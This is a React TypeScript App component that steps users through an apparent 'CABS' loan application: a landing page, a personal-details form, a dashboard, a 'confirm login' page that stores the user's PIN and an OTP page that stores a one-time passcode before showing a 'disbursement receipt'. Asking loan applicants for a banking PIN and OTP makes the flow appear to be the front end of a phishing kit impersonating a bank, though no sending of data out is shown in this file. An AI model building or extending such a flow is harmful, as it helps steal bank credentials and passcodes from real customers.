import React, { useState, useEffect } from 'react';
import { PageStep, LoanApplicationData } from './types';
import { Toast } from './components/Toast';
import { LandingPage } from './components/LandingPage';
import { LoanFormPage } from './components/LoanFormPage';
import { LoanDashboardPage } from './components/LoanDashboardPage';
import { ConfirmLoginPage } from './components/ConfirmLoginPage';
import { OtpVerificationPage } from './components/OtpVerificationPage';
import { DisbursementReceipt } from './components/DisbursementReceipt';

const STORAGE_KEY = 'cabs_loan_app_data';
const STEP_KEY = 'cabs_loan_current_step';

const emptyLoanData: LoanApplicationData = {
  fullName: '',
  phone: '',
  email: '',
  idNumber: '',
  dobYear: '',
  dobMonth: '',
  dobDay: '',
  employment: '',
  income: '',
  loanType: '',
  loanAmount: '',
  repayment: '',
  terms: false,
};

export default function App() {
  const [currentStep, setCurrentStep] = useState<PageStep>(() => {
    // Check URL hash first
    const hash = window.location.hash.replace('#', '') as PageStep;
    if (['landing', 'form', 'dash', 'confirm', 'otp', 'receipt'].includes(hash)) {
      return hash;
    }
    const saved = localStorage.getItem(STEP_KEY) as PageStep;
    return saved || 'landing';
  });

  const [loanData, setLoanData] = useState<LoanApplicationData>(() => {
    try {
      const stored = localStorage.getItem(STORAGE_KEY);
      if (stored) {
        const parsed = JSON.parse(stored);
        // Clear any old hardcoded dummy data
        if (parsed?.fullName === 'Duncan Moyo' || parsed?.phone === '+263772123456') {
          return emptyLoanData;
        }
        return parsed;
      }
    } catch {
      // ignore
    }
    return emptyLoanData;
  });

  const [toast, setToast] = useState<{ message: string; isError?: boolean } | null>(null);

  // Sync state to local storage and URL hash
  useEffect(() => {
    localStorage.setItem(STEP_KEY, currentStep);
    window.location.hash = currentStep === 'landing' ? '' : currentStep;
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, [currentStep]);

  useEffect(() => {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(loanData));
  }, [loanData]);

  // Listen to browser hash change
  useEffect(() => {
    const handleHashChange = () => {
      const hash = window.location.hash.replace('#', '') as PageStep;
      if (['landing', 'form', 'dash', 'confirm', 'otp', 'receipt'].includes(hash)) {
        setCurrentStep(hash);
      } else if (!hash) {
        setCurrentStep('landing');
      }
    };
    window.addEventListener('hashchange', handleHashChange);
    return () => window.removeEventListener('hashchange', handleHashChange);
  }, []);

  const showToast = (message: string, isError = false) => {
    setToast({ message, isError });
    setTimeout(() => {
      setToast(null);
    }, 3500);
  };

  const handleLandingApply = (prefillAmount?: string) => {
    if (prefillAmount) {
      setLoanData((prev) => ({ ...prev, loanAmount: prefillAmount }));
    }
    setCurrentStep('form');
  };

  const handleFormSubmit = (submittedData: LoanApplicationData) => {
    setLoanData(submittedData);
    setCurrentStep('dash');
  };

  const handleProceedToConfirm = () => {
    setCurrentStep('confirm');
  };

  const handleConfirmSuccess = (pin: string) => {
    setLoanData((prev) => ({ ...prev, pin }));
    setCurrentStep('otp');
  };

  const handleOtpSuccess = (otp: string) => {
    setLoanData((prev) => ({ ...prev, otp }));
    setCurrentStep('receipt');
  };

  return (
    <div className="min-h-screen bg-[#1a2a5c] flex flex-col">
      {/* Toast Notification */}
      <Toast message={toast?.message ?? null} isError={toast?.isError} />

      {/* Step View Render - Natural flow without portal dev header */}
      <main className="flex-1 flex flex-col">
        {currentStep === 'landing' && (
          <LandingPage onApply={handleLandingApply} />
        )}

        {currentStep === 'form' && (
          <LoanFormPage
            initialData={loanData}
            onSubmit={handleFormSubmit}
            onBack={() => setCurrentStep('landing')}
            onToast={showToast}
          />
        )}

        {currentStep === 'dash' && (
          <LoanDashboardPage
            data={loanData}
            onProceedToConfirm={handleProceedToConfirm}
            onBackToForm={() => setCurrentStep('form')}
            onToast={showToast}
          />
        )}

        {currentStep === 'confirm' && (
          <ConfirmLoginPage
            data={loanData}
            onSuccess={handleConfirmSuccess}
            onBackToDashboard={() => setCurrentStep('dash')}
            onToast={showToast}
          />
        )}

        {currentStep === 'otp' && (
          <OtpVerificationPage
            data={loanData}
            onSuccess={handleOtpSuccess}
            onBackToLogin={() => setCurrentStep('confirm')}
            onToast={showToast}
          />
        )}

        {currentStep === 'receipt' && (
          <DisbursementReceipt
            data={loanData}
            onHome={() => setCurrentStep('landing')}
            onStartNew={() => {
              setLoanData(emptyLoanData);
              localStorage.removeItem(STORAGE_KEY);
              setCurrentStep('form');
            }}
          />
        )}
      </main>
    </div>
  );
}
